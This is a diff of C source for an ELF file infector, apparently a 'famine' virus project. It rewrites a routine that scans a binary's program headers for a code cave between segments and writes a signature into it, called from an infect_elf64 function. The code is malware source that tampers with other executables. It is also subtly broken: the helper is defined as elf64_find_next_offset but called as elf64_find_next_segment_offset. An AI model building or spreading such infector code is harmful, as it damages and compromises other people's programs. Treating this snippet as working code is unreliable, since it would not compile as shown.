@@ -1,28 +1,48 @@
 #include "famine.h"
+#include <limits.h>
+#include <string.h>
 
-int sign_elf64_cavity(t_elf64 *elf64)
+uint64_t elf64_find_next_offset(Elf64_Phdr *phdr, uint32_t phnum, uint32_t index)
 {
-	uint64_t gap_start, gap_end;
+	uint64_t curr, next, tmp;
 
-	for (uint32_t i = 0; i + 1 < ehdr->e_phnum; i++) {
-		gap_start = phdr[i].p_offset + phdr[i].p_filesz;
-		gap_end = find_next_program;
+	curr = phdr[index].p_offset;
+	next = UINT64_MAX;
 
-		if (gap_end - gap_start < SIGNATURE_SIZE)
+	for (uint32_t i = 0; i < phnum; i++) {
+		if (i == index)
 			continue ;
-		if (gap_start + SIGNATURE_SIZE > file->size)
+
+		tmp = phdr[i].p_offset;
+		if (tmp > curr && tmp < next)
+			next = tmp;
+	}
+	return (next);
+}
+
+int sign_elf64_cavity(t_file *file, t_elf64 *elf64)
+{
+	uint64_t cave_start, cave_end;
+
+	for (uint32_t i = 0; i < elf64->ehdr->e_phnum; i++) {
+		cave_start = elf64->phdr[i].p_offset + elf64->phdr[i].p_filesz;
+		cave_end = elf64_find_next_segment_offset(elf64->phdr, elf64->ehdr->e_phnum, i);
+
+		if (cave_end == UINT64_MAX)
+			continue ;
+		if (cave_end - cave_start < SIGNATURE_SIZE)
+			continue ;
+		if (cave_start + SIGNATURE_SIZE > file->size)
 			continue;
 
-		if (phdr[i + 1].p_offset - (phdr[i].p_offset + phdr[i].p_filesz) > SIGNATURE_SIZE) {
-			memcpy((unsigned char *)file->map + phdr[i].p_offset + phdr[i].p_filesz, SIGNATURE, SIGNATURE_SIZE);
-			return (0);
-		}
+		memcpy(file->map + cave_start, SIGNATURE, SIGNATURE_SIZE);
+		return (0);
 	}
 	return (1);
 }
 
 void infect_elf64(t_file *file, t_elf64 *elf64)
 {
-	if (sign_elf64_cavity(elf64))
+	if (sign_elf64_cavity(file, elf64))
 		return ;
 }
